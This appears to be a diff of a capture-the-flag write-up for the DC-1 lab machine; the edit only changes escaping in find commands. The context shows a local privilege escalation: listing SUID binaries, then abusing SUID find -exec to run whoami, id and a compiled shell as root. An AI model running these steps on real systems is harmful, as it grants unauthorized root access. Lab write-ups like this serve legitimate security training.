@@ -172,7 +172,7 @@ Now, the final task. Get root.
 flag4@DC-1:~$ uname -a  
 >Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux  
   
-flag4@DC-1:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null    
+flag4@DC-1:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null    
 >-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount  
 >-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping  
 >-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su  
@@ -190,10 +190,10 @@ flag4@DC-1:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -l
   
 Find it is.  
   
-flag4@DC-1:~$ /usr/bin/find -exec whoami \;  
+flag4@DC-1:~$ /usr/bin/find -exec whoami \\;  
 >root  
   
-flag4@DC-1:~$ /usr/bin/find -exec id \;  
+flag4@DC-1:~$ /usr/bin/find -exec id \\;  
 >uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)  
   
 We can execute commands as root, so let's pop up a shell with a very simple c program:  
@@ -213,7 +213,7 @@ flag4DC-1:~$ cat shell.c
   
 flag4@DC-1:~$ gcc shell.c -o shell  
   
-flag4@DC-1:~$ /usr/bin/find -exec /home/flag4/shell \;  
+flag4@DC-1:~$ /usr/bin/find -exec /home/flag4/shell \\;  
   
 root@DC-1:~# id  
 >uid=0(root) gid=1001(flag4) groups=0(root),1001(flag4)  
